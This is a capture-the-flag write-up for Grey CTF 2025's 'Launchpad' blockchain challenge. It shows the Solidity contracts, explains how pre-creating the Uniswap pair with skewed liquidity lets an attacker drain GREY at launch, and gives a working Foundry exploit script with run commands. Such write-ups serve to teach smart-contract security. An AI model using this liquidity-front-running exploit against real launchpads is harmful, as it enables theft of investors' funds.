# 🚩 Launchpad – Hard

- **Category:** Blockchain
- **CTF Event:** Grey CTF 2025
- **Difficulty:** Hard

---

## Challenge Description

> Since token launchpads are the new trend nowadays, we decided to write our own! Will grey.fun be the next billion dollar protocol?

---

## Challenge Files

- [`Factory.sol`](src/Factory.sol)
- [`Setup.sol`](src/Setup.sol)
- [`Token.sol`](src/Token.sol)

Here only listed the core files in the challenge and excluding library files. If you are interested to all the given files including the library files, you may check at here, [src/](src/).

---

## Objective

### `Setup.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GREY} from "./lib/GREY.sol";
import {UniswapV2Factory} from "./lib/v2-core/UniswapV2Factory.sol";
import {Factory} from "./Factory.sol";
import {Token} from "./Token.sol";
import {console2} from "../lib/forge-std/src/console2.sol";

contract Setup {
    bool public claimed;

    // GREY token
    GREY public grey;

    // Challenge contracts
    UniswapV2Factory public uniswapV2Factory;
    Factory public factory;
    Token public meme;

    constructor() {
        // Deploy the GREY token contract
        grey = new GREY();

        // Mint 7 GREY for setup
        grey.mint(address(this), 7 ether);

        // Deploy challenge contracts
        uniswapV2Factory = new UniswapV2Factory(address(0xdead));
        factory = new Factory(address(grey), address(uniswapV2Factory), 2 ether, 6 ether);

        // Create a meme token
        (address _meme,) = factory.createToken("Meme", "MEME", bytes32(0), 0);
        meme = Token(_meme);

        // Buy 2 GREY worth of MEME
        grey.approve(address(factory), 2 ether);
        factory.buyTokens(_meme, 2 ether, 0);
        console2.log("Meme token address:", address(meme));
        console2.log("GREY token address:", address(grey));
        console2.log("UniswapV2Factory address:", address(uniswapV2Factory));
        console2.log("Factory address:", address(factory));
        console2.log("Setup Address:", address(this));
        }

    // Note: Call this function to claim 5 GREY for the challenge
    function claim() external {
        require(!claimed, "already claimed");
        claimed = true;

        grey.transfer(msg.sender, 5 ether);
    }

    // Note: Challenge is solved when you have at least 5.965 GREY
    function isSolved() external view returns (bool) {
        return grey.balanceOf(msg.sender) >= 5.965 ether;
    }
}
```

The main goal is to have more than or equal to 5.965 ether of GREY token as required in the `isSolved()` function in the `Setup` contract.

---

## Code Analysis
  

### `Token.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {ERC20} from "./lib/solmate/ERC20.sol";

contract Token is ERC20 {
    error NotFactory();

    uint256 public constant INITIAL_AMOUNT = 1000_000e18;

    address public immutable factory;

    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol, 18) {
        factory = msg.sender;

        _mint(factory, INITIAL_AMOUNT);
    }

    function burn(uint256 amount) external {
        if (msg.sender != factory) revert NotFactory();

        _burn(msg.sender, amount);
    }
}
```

The `Token` contract is a simple ERC20 token implementation used for new tokens created by the launchpad. It inherits from a standard ERC20 contract and introduces a few custom restrictions including only the factory can mint the initial supply and burn the token.

---

### `Factory.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Owned} from "./lib/solmate/Owned.sol";
import {FixedPointMathLib} from "./lib/solmate/FixedPointMathLib.sol";
import {IUniswapV2Factory} from "./lib/v2-core/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Pair} from "./lib/v2-core/interfaces/IUniswapV2Pair.sol";
import {GREY} from "./lib/GREY.sol";
import {Token} from "./Token.sol";
import {console2} from "../lib/forge-std/src/console2.sol";

contract Factory is Owned {
    using FixedPointMathLib for uint256;

    error MinimumLiquidityTooSmall();
    error TargetGREYRaisedTooLarge();
    error TargetGREYRaisedReached();
    error TargetGREYRaisedNotReached();
    error InsufficientAmountIn();
    error InsufficientAmountOut();
    error InsufficientLiquidity();
    error InsufficientGREYLiquidity();
    error InvalidToken();

    event TokenCreated(address indexed token, address indexed creator);
    event TokenBought(address indexed user, address indexed token, uint256 indexed ethAmount, uint256 tokenAmount);
    event TokenSold(address indexed user, address indexed token, uint256 indexed ethAmount, uint256 tokenAmount);
    event TokenLaunched(address indexed token, address indexed uniswapV2Pair);

    struct Pair {
        uint256 virtualLiquidity;
        uint256 reserveGREY;
        uint256 reserveToken;
    }

    uint256 public constant MINIMUM_VIRTUAL_LIQUIDITY = 0.01 ether;

    GREY public immutable grey;

    IUniswapV2Factory public immutable uniswapV2Factory;

    // Amount of "fake" GREY liquidity each pair starts with
    uint256 public virtualLiquidity;

    // Amount of GREY to be raised for bonding to end
    uint256 public targetGREYRaised;

    // Reserves and additional info for each token
    mapping(address => Pair) public pairs;

    // ======================================== CONSTRUCTOR ========================================

    constructor(address _grey, address _uniswapV2Factory, uint256 _virtualLiquidity, uint256 _targetGREYRaised)
        Owned(msg.sender)
    {
        if (_virtualLiquidity < MINIMUM_VIRTUAL_LIQUIDITY) {
            revert MinimumLiquidityTooSmall();
        }

        grey = GREY(_grey);
        uniswapV2Factory = IUniswapV2Factory(_uniswapV2Factory);

        virtualLiquidity = _virtualLiquidity; // virtualLiquidity = 2 ether
        targetGREYRaised = _targetGREYRaised; // targetGREYRaised = 6 ether
    }

    // ======================================== ADMIN FUNCTIONS ========================================

    function setVirtualLiquidity(uint256 _virtualLiquidity) external onlyOwner {
        if (_virtualLiquidity < MINIMUM_VIRTUAL_LIQUIDITY) {
            revert MinimumLiquidityTooSmall();
        }

        virtualLiquidity = _virtualLiquidity;
    }

    function setTargetGREYRaised(uint256 _targetGREYRaised) external onlyOwner {
        targetGREYRaised = _targetGREYRaised;
    }

    // ======================================== USER FUNCTIONS ========================================

    function createToken(string memory name, string memory symbol, bytes32 salt, uint256 amountIn)
        external
        returns (address tokenAddress, uint256 amountOut)
    {
        Token token = new Token{salt: salt}(name, symbol);
        tokenAddress = address(token);

        pairs[tokenAddress] = Pair({
            virtualLiquidity: virtualLiquidity, // virtualLiquidity = 2 ether
            reserveGREY: virtualLiquidity, // reserveGREY = 2 ether
            reserveToken: token.INITIAL_AMOUNT() // reserveToken = 1000_000e18
        });

        if (amountIn != 0) amountOut = _buyTokens(tokenAddress, amountIn, 0);

        emit TokenCreated(tokenAddress, msg.sender);
    }

    function buyTokens(address token, uint256 amountIn, uint256 minAmountOut) external returns (uint256 amountOut) {
        Pair memory pair = pairs[token];
        if (pair.virtualLiquidity == 0) revert InvalidToken();

        uint256 actualLiquidity = pair.reserveGREY - pair.virtualLiquidity;
        if (actualLiquidity >= targetGREYRaised) {
            revert TargetGREYRaisedReached();
        }

        amountOut = _buyTokens(token, amountIn, minAmountOut);
    }

    function sellTokens(address token, uint256 amountIn, uint256 minAmountOut) external returns (uint256 amountOut) {
        Pair storage pair = pairs[token];
        if (pair.virtualLiquidity == 0) revert InvalidToken();

        uint256 actualLiquidity = pair.reserveGREY - pair.virtualLiquidity;
        if (actualLiquidity >= targetGREYRaised) {
            revert TargetGREYRaisedReached();
        }

        amountOut = _getAmountOut(amountIn, pair.reserveToken, pair.reserveGREY);

        // In theory, this check should never fail
        if (amountOut > actualLiquidity) revert InsufficientGREYLiquidity();

        pair.reserveToken += amountIn;
        pair.reserveGREY -= amountOut;

        if (amountOut < minAmountOut) revert InsufficientAmountOut();

        Token(token).transferFrom(msg.sender, address(this), amountIn);
        grey.transfer(msg.sender, amountOut);

        emit TokenSold(msg.sender, token, amountOut, amountIn);
    }

    function launchToken(address token) external returns (address uniswapV2Pair) {
        Pair memory pair = pairs[token];

        console2.log("Value of pair.virtualLiquidity:", pair.virtualLiquidity);
        if (pair.virtualLiquidity == 0) revert InvalidToken();

        // pair.reserveGREY need to be 8 ether to launch
        uint256 actualLiquidity = pair.reserveGREY - pair.virtualLiquidity;
        if (actualLiquidity < targetGREYRaised) {
            revert TargetGREYRaisedNotReached();
        }

        delete pairs[token];

        uint256 greyAmount = actualLiquidity;
        console2.log("GREY amount to launch:", greyAmount);
        uint256 tokenAmount = pair.reserveToken;

        // Burn tokens equal to ratio of reserveGREY removed to maintain constant price
        uint256 burnAmount = (pair.virtualLiquidity * tokenAmount) / pair.reserveGREY;
        tokenAmount -= burnAmount;
        Token(token).burn(burnAmount);

        uniswapV2Pair = uniswapV2Factory.getPair(address(grey), address(token));
        if (uniswapV2Pair == address(0)) {
            uniswapV2Pair = uniswapV2Factory.createPair(address(grey), address(token));
        }

        grey.transfer(uniswapV2Pair, greyAmount);
        Token(token).transfer(uniswapV2Pair, tokenAmount);

        IUniswapV2Pair(uniswapV2Pair).mint(address(0xdEaD));

        emit TokenLaunched(token, uniswapV2Pair);
    }

    // ======================================== VIEW FUNCTIONS ========================================

    function previewBuyTokens(address token, uint256 amountIn) external view returns (uint256 amountOut) {
        Pair memory pair = pairs[token];
        amountOut = _getAmountOut(amountIn, pair.reserveGREY, pair.reserveToken);
    }

    function previewSellTokens(address token, uint256 amountIn) external view returns (uint256 amountOut) {
        Pair memory pair = pairs[token];

        amountOut = _getAmountOut(amountIn, pair.reserveToken, pair.reserveGREY);

        uint256 actualLiquidity = pair.reserveGREY - pair.virtualLiquidity;
        if (amountOut > actualLiquidity) revert InsufficientGREYLiquidity();
    }

    function tokenPrice(address token) external view returns (uint256 price) {
        Pair memory pair = pairs[token];
        price = pair.reserveGREY.divWadDown(pair.reserveToken);
    }

    function bondingCurveProgress(address token) external view returns (uint256 progress) {
        Pair memory pair = pairs[token];
        uint256 actualLiquidity = pair.reserveGREY - pair.virtualLiquidity;
        progress = actualLiquidity.divWadDown(targetGREYRaised);
    }

    // ======================================== HELPER FUNCTIONS ========================================

    // pass
    function _buyTokens(address token, uint256 amountIn, uint256 minAmountOut) internal returns (uint256 amountOut) {
        Pair storage pair = pairs[token];

        amountOut = _getAmountOut(amountIn, pair.reserveGREY, pair.reserveToken);

        pair.reserveGREY += amountIn;
        pair.reserveToken -= amountOut;

        if (amountOut < minAmountOut) revert InsufficientAmountOut();

        grey.transferFrom(msg.sender, address(this), amountIn);
        Token(token).transfer(msg.sender, amountOut);

        emit TokenBought(msg.sender, token, amountIn, amountOut);
    }

    // pass
    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0) revert InsufficientAmountIn();
        if (reserveIn == 0 || reserveOut == 0) revert InsufficientLiquidity();

        return (amountIn * reserveOut) / (reserveIn + amountIn);
    }
}
```

The Factory contract is the core of the launchpad system, responsible for managing the lifecycle of new tokens, handling bonding curve sales, and launching tokens onto Uniswap. The contract uses a bonding curve to allow users to buy and sell new tokens (like `MEME`) using the `GREY` token before the token is launched. The price is determined dynamically based on the reserves and a virtual liquidity parameter, which helps bootstrap initial liquidity and price discovery. 

For token creation, users can create new tokens through the factory using `createToken()`. Each new token starts with a fixed initial supply (fixed in `Token.sol`) and is tracked in the pairs mapping, which stores the virtual liquidity and reserves for GREY and the token. For buying and selling tokens, users can buy tokens by sending GREY to the factory, or sell tokens back to the factory for GREY by calling `buyTokens()` and `sellTokens()`, as long as the bonding curve phase is active. The contract ensures that the correct amount of tokens or GREY is transferred based on the bonding curve formula defined in `_getAmountOut()` which will be called in `_buyTokens()` and `sellTokens()`. For launching tokens, once a target amount of GREY, 6 ether (value defined in `targetGREYRaised` in constructor) has been raised, anyone can call launchToken to end the bonding curve phase by using `launchToken()`. It will then transfer the accumulated GREY and token reserves to a Uniswap V2 pair and burn a portion of the token supply to maintain price consistency, and also mint LP tokens to a burn address, `address(0xdEaD)`, effectively locking initial liquidity.

However, we can observe that during the construction of UniswapV2Factory in the `Setup.sol`, it is using the default UniswapV2Factory contract which will cause a terrible consequence while utilizing it in a launchpad as attackers are able to create the pair for `MEME` before the token are launched, and then providing liquidity with a skewed ratio of `GREY` and `MEME` tokens to get LP tokens that is equivalent to the value of liquidity provided. By doing this, after the token is being launched and reserves `GREY` and `MEME` are added into the pool, the attackers can burn their LP tokens to withdraw a large share of the pool’s reserves (including the newly added `GREY`).

---


## Exploitation

The exploit works by creating the Uniswap pair and providing liquidity with a highly skewed ratio (almost all MEME, almost no GREY) before the official launch. This gives us nearly all the LP tokens even after the token has been launched. When the factory launches the token and adds the real reserves, we can burn our LP tokens to withdraw almost all of the pool’s `GREY`. Finally, we swap remaining `MEME` for even more `GREY`, draining the pool and solving the challenge.

```solidity
function run() external {
    vm.startBroadcast();

    // Claim the GREY tokens
    setup.claim();

    // Buy 5e18 - 1 GREY worth of MEME
    grey.approve(address(factory), type(uint256).max);
    meme.approve(address(factory), type(uint256).max);
    factory.buyTokens(address(meme), 5 ether - 1, 0);

    // Create a Uniswap pair for GREY and MEME
    address pair = uniswapV2Factory.createPair(address(grey), address(meme));

    // Provide liquidity to the pair
    grey.transfer(pair, 1);
    meme.transfer(pair, meme.balanceOf(me));
    uint256 lpToken = IUniswapV2Pair(pair).mint(me);

    // Launch the token
    factory.launchToken(address(meme));

    // Burn the LP tokens to remove liquidity
    UniswapV2Pair(pair).transfer(pair, lpToken);
    IUniswapV2Pair(pair).burn(me);

    // Swap the remaining MEME for GREY
    uint256 memeBalance = meme.balanceOf(me);
    meme.transfer(pair, memeBalance);
    uint256 minimumTargetGREY = 5.965 ether - grey.balanceOf(me);
    bool isGREYToken0 = (IUniswapV2Pair(pair).token0() == address(grey));
    IUniswapV2Pair(pair).swap(isGREYToken0 ? minimumTargetGREY : 0, isGREYToken0 ? 0 : minimumTargetGREY, me, "");
        
    vm.stopBroadcast();
}
```

See the full exploitation script [here](script/Exploit.s.sol). If you are interested with the test script as well, see the test script [here](test/Exploit.t.sol).

### Command to Deploy the Script and Test

For `Exploit.s.sol`:

```bash
forge script script/Exploit.s.sol:Exploit --broadcast --rpc-url $RPC_URL --private-key $PK
```

For `Exploit.t.sol`:

```bash
forge test --match-test testExploit
```

Please kindly save the variables in the `.env` file. However, and please don't save your private key in plaint text in production!

---